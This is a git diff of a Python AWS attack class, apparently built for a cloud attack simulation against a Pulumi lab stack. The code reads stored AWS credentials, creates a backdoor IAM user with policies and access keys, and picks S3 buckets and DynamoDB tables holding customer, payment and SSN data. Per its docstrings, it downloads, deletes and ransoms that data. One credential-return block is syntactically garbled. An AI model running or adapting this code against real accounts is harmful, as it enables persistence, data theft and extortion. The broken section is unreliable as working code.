@@ -48,7 +48,7 @@ class Attack:
         # --------------------- #
         # Initialize Subclasses #
         # --------------------- #
-        self.session_hijack = self.SessionHijack(self.devops_user, self.sts_client)
+        # self.session_hijack = self.SessionHijack(self.devops_user, self.sts_client)
 
 
         # ------------------------------------- #
@@ -116,6 +116,8 @@ class Attack:
         return self.pulumi_outputs.get(key, f"ERROR: {key} not found in Pulumi outputs.")
 
 
+
+
     def load_credentials_from_file(self):
         """🔍 Reads AWS credentials manually from ~/.aws/credentials"""
         config = configparser.ConfigParser()
@@ -135,6 +137,9 @@ class Attack:
 
         print(f"Loaded credentials from {self.credentials_path}: AccessKey={access_key[:5]}... SessionToken={session_token[:10]}...")
         return access_key, secret_key, session_token
+
+
+
 
 
     class Enumeration:
@@ -202,15 +207,12 @@ class Attack:
 
 
 
-
-
     class AWS_CreateUser_AttachPolicies:
         def __init__(self, attack_instance):
             """Initialize with an authenticated session"""
-            """Use DevOpsUser's AWS session"""
-            self.session = attack_instance.session
-            self.iam_client = self.session.client('iam')
-
+            self.attack_instance = attack_instance  # Store attack instance reference
+            self.iam_client = attack_instance.session.client('iam')  # Use attack session
+    
         def create_user(self, username):
             """Creates an IAM user"""
             try:
@@ -218,44 +220,133 @@ class Attack:
                 print(f"User {username} created successfully.")
                 return response['User']
             except Exception as e:
-                print(f"Error creating user: {e}")
+                print(f"ERROR: Creating user {username}: {e}")
                 return None
-
+    
         def create_access_keys(self, username):
             """Creates access keys for the IAM user"""
             try:
                 response = self.iam_client.create_access_key(UserName=username)
-                print(f"Access keys created for {username}.")
-                return response['AccessKey']
+                access_key = response['AccessKey']
+                print(f"Access Key Created: {access_key['AccessKeyId']}")
+                return access_key
             except Exception as e:
-                print(f"Error creating access keys: {e}")
+                print(f"ERROR: Creating access keys for {username}: {e}")
                 return None
-
+    
         def attach_policies(self, username, policy_arns):
-            """Attaches policies to the IAM user"""
+            """Attaches AWS managed policies"""
             for policy_arn in policy_arns:
                 try:
                     self.iam_client.attach_user_policy(UserName=username, PolicyArn=policy_arn)
-                    print(f"Attached policy {policy_arn} to {username}.")
+                    print(f"Attached policy {policy_arn} to {username}")
                 except Exception as e:
-                    print(f"Error attaching policy {policy_arn}: {e}")
+                    print(f"ERROR: Attaching policy {policy_arn}: {e}")
+    
+        def attach_inline_policy(self, username):
+            """Attaches an inline policy that allows sts:GetCallerIdentity"""
+            try:
+                self.iam_client.put_user_policy(
+                    UserName=username,
+                    PolicyName="AllowSTSToken",
+                    PolicyDocument=json.dumps({
+                        "Version": "2012-10-17",
+                        "Statement": [
+                            {
+                                "Effect": "Allow",
+                                "Action": "sts:GetCallerIdentity",
+                                "Resource": "*"
+                            }
+                        ]
+                    })
+                )
+                print(f"Inline policy 'AllowSTSToken' attached to {username}")
+            except Exception as e:
+                print(f"ERROR: Attaching inline policy to {username}: {e}")
+    
+        def validate_session(self, session):
+            """Validates if the AWS session is working by checking identity"""
+            try:
+                sts_client = session.client("sts")
+                identity = sts_client.get_caller_identity()
+                print(f"Confirmed AWS Identity: {identity['Arn']}")
+                return True  # Session is valid
+            except Exception as e:
+                print(f"ERROR: Invalid session credentials: {e}")
+                return False  # Session is invalid
+            
 
+    
         def run_pipeline(self, username, policy_arns):
             """Executes the full pipeline: create user, attach policies, then create access keys"""
             user = self.create_user(username)
-            if user:
-                self.attach_policies(username, policy_arns)
-                access_keys = self.create_access_keys(username)
-                return access_keys  # Returning access keys if needed for further processing
-            return None
+            if not user:
+                return None
+    
+            # Attach managed & inline policies BEFORE creating access keys
+            self.attach_policies(username, policy_arns)
+            self.attach_inline_policy(username)
+    
+            access_keys = self.create_access_keys(username)
+            if not access_keys:
+                return None
+    
+            # Completely clear old AWS credentials
+            print("🧹 Clearing previous AWS session...")
+            os.environ.pop("AWS_SESSION_TOKEN", None)
+            os.environ.pop("AWS_ACCESS_KEY_ID", None)
+            os.environ.pop("AWS_SECRET_ACCESS_KEY", None)
+    
+            # Wait for AWS to register the new keys
+            time.sleep(5)
+    
+            # Create a new isolated session
+
+            aws_access_key_id=access_keys['AccessKeyId'],
+            aws_secret_access_key=access_keys['SecretAccessKey'],
+
+            return aws_access_key_id, aws_secret_access_key
+    
+
+
+
+
+
+
 
 
 
     class S3_Drain_Delete:
-        def __init__(self, session, target_s3_arns):
+        def __init__(self, session):
             """Initialize S3 client and target S3 buckets"""
             self.s3_client = session.client('s3')
-            self.target_buckets = [arn.split(":")[-1] for arn in target_s3_arns]  # Extract bucket names from ARNs
+            self.target_buckets = self.get_target_s3_buckets()  # Extract bucket names from ARNs
+
+
+
+
+        # Fetch all buckets & filter by name
+        def get_target_s3_buckets(self):
+            all_buckets = self.s3_client.list_buckets().get('Buckets', [])
+
+            # Define naming patterns to match Pulumi dynamically generated s3 buckets, aka
+            # the buckets that are loaded into pulumi stack during runtime
+            s3_target_patterns = [
+                "company-data-Q1-2024", "company-data-Q2-2024", "company-data-Q3-2024",
+                "company-data-Q4-2024", "Configuration_Files", "Customer_Data", "Payment_Data"
+            ]
+
+            target_buckets = [
+                bucket['Name'] for bucket in all_buckets if any(pattern in bucket['Name'] for pattern in s3_target_patterns)
+            ]
+
+            
+            print("Target S3 Buckets:", target_buckets)
+
+            return target_buckets
+        
+        
+
 
         def search_and_exfiltrate(self, exfiltration_path="./s3_Exfiltration"):
             """Downloads all objects from targeted buckets, deletes them, and leaves a ransom note"""
@@ -282,11 +373,25 @@ class Attack:
 
 
     class DynamoDB_Drain_Delete:
-        def __init__(self, session, target_dynamodb_arns):
+        def __init__(self, session):
             """Initialize DynamoDB client and target tables"""
             self.dynamodb_client = session.client('dynamodb')
             self.dynamodb_resource = session.resource('dynamodb')
-            self.target_tables = [arn.split("/")[-1] for arn in target_dynamodb_arns]  # Extract table names from ARNs
+            self.target_tables = self.get_target_dynamodb_tables()  # Extract table names from ARNs
+
+
+        # Fetch all tables & filter by name
+        def get_target_dynamodb_tables(self):
+            all_tables = self.dynamodb_client.list_tables().get('TableNames', [])
+
+            # Define naming patterns to match Pulumi dynamically generated dynamodb tables, aka
+            # the tables that are loaded into pulumi stack during runtime
+            dynamodb_target_patterns = ["CustomerOrdersTable", "CustomerSSNTable"]
+
+            target_tables = [table for table in all_tables if any(pattern in table for pattern in dynamodb_target_patterns)]
+            return target_tables
+
+
 
         def search_and_exfiltrate(self, exfiltration_path="./DynamoDB_Exfiltration"):
             """Downloads all content from targeted tables, deletes them, and leaves a ransom note"""
